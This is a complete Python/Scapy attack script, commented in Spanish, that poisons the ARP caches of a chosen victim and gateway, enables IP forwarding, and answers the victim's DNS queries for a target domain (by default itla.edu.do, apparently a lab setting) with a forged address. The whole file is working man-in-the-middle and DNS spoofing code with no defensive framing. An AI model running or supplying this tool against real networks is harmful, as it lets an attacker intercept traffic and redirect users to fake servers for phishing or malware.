#!/usr/bin/env python3

#########################################################
# Ataque:  DNS Spoofing via ARP MitM
# Autor:   Luiggy Encarnacion
#########################################################

from scapy.all import *
import time
import os
import sys
import threading
import signal

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

# ─────────────────────────────────────────
def banner(title):
    width = 40
    print()
    print("  ╔" + "═" * width + "╗")
    print("  ║" + title.center(width) + "║")
    print("  ╚" + "═" * width + "╝")

def separator():
    print("  " + "─" * 42)

# ─────────────────────────────────────────
def select_interface():
    try:
        interfaces = get_if_list()
    except Exception:
        interfaces = []

    if not interfaces:
        print("  [!] No se detectaron interfaces de red.")
        return input("  Ingrese el nombre de la interfaz manualmente: ").strip()

    print()
    print("  Interfaces de red disponibles:")
    for i, iface in enumerate(interfaces, 1):
        print(f"    [{i}] {iface}")
    print()

    while True:
        seleccion = input("  Seleccione interfaz (número o nombre): ").strip()
        if seleccion.isdigit():
            idx = int(seleccion) - 1
            if 0 <= idx < len(interfaces):
                return interfaces[idx]
            else:
                print("  [!] Número fuera de rango.")
        elif seleccion in interfaces:
            return seleccion
        else:
            print("  [!] Interfaz no válida.")

def solicitar_parametros():
    banner("DNS Spoofing + ARP MitM")
    print()

    try:
        iface      = select_interface()
        print()
        victim_ip  = input("  Ingrese la IP de la víctima            : ").strip()
        gateway_ip = input("  Ingrese la IP del gateway              : ").strip()
        domain     = input("  Dominio a spoof (default: itla.edu.do) : ").strip() or "itla.edu.do"
        spoof_ip   = input("  IP falsa del dominio (web server)      : ").strip()
        print()
    except KeyboardInterrupt:
        print()
        print("  [!] Saliendo.")
        sys.exit(0)

    return iface, victim_ip, gateway_ip, domain, spoof_ip

# ─────────────────────────────────────────
def get_mac(ip, iface):
    answered, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        iface=iface, timeout=3, verbose=False, retry=2
    )
    return answered[0][1].hwsrc if answered else None

# ─────────────────────────────────────────
def arp_spoof(target_ip, target_mac, gateway_ip, gateway_mac, attacker_mac, iface):
    pkt_victim = Ether(dst=target_mac, src=attacker_mac) / ARP(
        op=2,
        pdst=target_ip,  psrc=gateway_ip,
        hwdst=target_mac, hwsrc=attacker_mac
    )
    pkt_gateway = Ether(dst=gateway_mac, src=attacker_mac) / ARP(
        op=2,
        pdst=gateway_ip, psrc=target_ip,
        hwdst=gateway_mac, hwsrc=attacker_mac
    )
    sendp(pkt_victim,  iface=iface, verbose=False)
    sendp(pkt_gateway, iface=iface, verbose=False)

def restore_arp(target_ip, target_mac, gateway_ip, gateway_mac, iface):
    sendp(
        Ether(dst=target_mac) / ARP(
            op=2,
            pdst=target_ip,  psrc=gateway_ip,
            hwsrc=gateway_mac, hwdst=target_mac
        ),
        iface=iface, count=5, verbose=False
    )
    sendp(
        Ether(dst=gateway_mac) / ARP(
            op=2,
            pdst=gateway_ip, psrc=target_ip,
            hwsrc=target_mac, hwdst=gateway_mac
        ),
        iface=iface, count=5, verbose=False
    )
    print()
    print("  [+] Tablas ARP restauradas.")

# ─────────────────────────────────────────
dns_count  = 0
arp_count  = 0
start_time = 0

def dns_spoof_handler(pkt, domain, spoof_ip, iface):
    global dns_count

    if not (DNS in pkt and pkt[DNS].qr == 0):
        return

    if not pkt.haslayer(IP) or not pkt.haslayer(UDP):
        return

    qname = pkt[DNS].qd.qname.decode().rstrip('.')

    if domain.lower() not in qname.lower():
        return

    resp = (
        Ether(dst=pkt[Ether].src, src=pkt[Ether].dst)
        / IP(dst=pkt[IP].src, src=pkt[IP].dst)
        / UDP(dport=pkt[UDP].sport, sport=53)
        / DNS(
            id=pkt[DNS].id,
            qr=1, aa=1, ra=1,
            qd=pkt[DNS].qd,
            an=DNSRR(
                rrname=pkt[DNS].qd.qname,
                ttl=300,
                rdata=spoof_ip
            )
        )
    )
    sendp(resp, iface=iface, verbose=False)
    dns_count += 1

    elapsed    = max(int(time.time() - start_time), 1)
    mins, secs = divmod(elapsed, 60)
    print(
        f"  {mins:02d}:{secs:02d}   "
        f"  ARP: {arp_count:>5,}   "
        f"  DNS Spoofed: {dns_count:>4}   "
        f"  [{qname} => {spoof_ip}]   ",
        end="\r"
    )

# ─────────────────────────────────────────
def dns_mitm():
    global arp_count, start_time

    iface, victim_ip, gateway_ip, domain, spoof_ip = solicitar_parametros()
    attacker_mac = get_if_hwaddr(iface)

    banner("DNS Spoofing + ARP MitM")
    print(f"  Interfaz  : {iface}")
    print(f"  Víctima   : {victim_ip}")
    print(f"  Gateway   : {gateway_ip}")
    print(f"  Dominio   : {domain}")
    print(f"  IP Falsa  : {spoof_ip}")
    separator()

    print("  [*] Resolviendo MACs...")
    victim_mac  = get_mac(victim_ip,  iface)
    gateway_mac = get_mac(gateway_ip, iface)

    if not victim_mac:
        print(f"  [-] No se encontró MAC de víctima ({victim_ip}). Saliendo.")
        sys.exit(1)
    if not gateway_mac:
        print(f"  [-] No se encontró MAC de gateway ({gateway_ip}). Saliendo.")
        sys.exit(1)

    separator()
    print(f"  MAC Víctima  : {victim_mac}")
    print(f"  MAC Gateway  : {gateway_mac}")
    print(f"  MAC Atacante : {attacker_mac}")
    separator()

    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print("  [*] IP Forwarding habilitado")
    print("  [*] Iniciando ARP Poisoning...")
    print("  [*] Ctrl+C para detener y restaurar")
    print()

    header = (
        f"  {'Tiempo':^8} "
        f"{'ARP':^10} "
        f"{'DNS Spoofed':^14} "
        f"{'Query':^30}"
    )
    print(header)
    print("  " + "─" * (len(header) - 2))

    start_time = time.time()

    # ── Thread ARP ──
    def arp_thread():
        global arp_count
        while True:
            arp_spoof(victim_ip, victim_mac, gateway_ip, gateway_mac, attacker_mac, iface)
            arp_count += 1
            time.sleep(2)

    thread = threading.Thread(target=arp_thread, daemon=True)
    thread.start()

    # ── Signal handler registrado DESPUÉS de resolver MACs ──
    def handle_exit(sig, frame):
        elapsed    = max(int(time.time() - start_time), 1)
        mins, secs = divmod(elapsed, 60)

        print()
        print()
        banner("Resumen Final")
        print(f"  Envenenamientos ARP      : {arp_count:,}")
        print(f"  DNS Spoofed              : {dns_count:,}")
        print(f"  Tiempo activo            : {mins:02d}:{secs:02d}")
        print()
        separator()
        print("  [*] Restaurando tablas ARP...")
        restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac, iface)
        print("  [+] Saliendo.")
        print()
        sys.exit(0)

    signal.signal(signal.SIGINT, handle_exit)

    # ── Sniff DNS ──
    sniff(
        iface=iface,
        filter="udp port 53",
        prn=lambda pkt: dns_spoof_handler(pkt, domain, spoof_ip, iface),
        store=0
    )

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("  [-] Se requieren privilegios root.")
        sys.exit(1)
    dns_mitm()
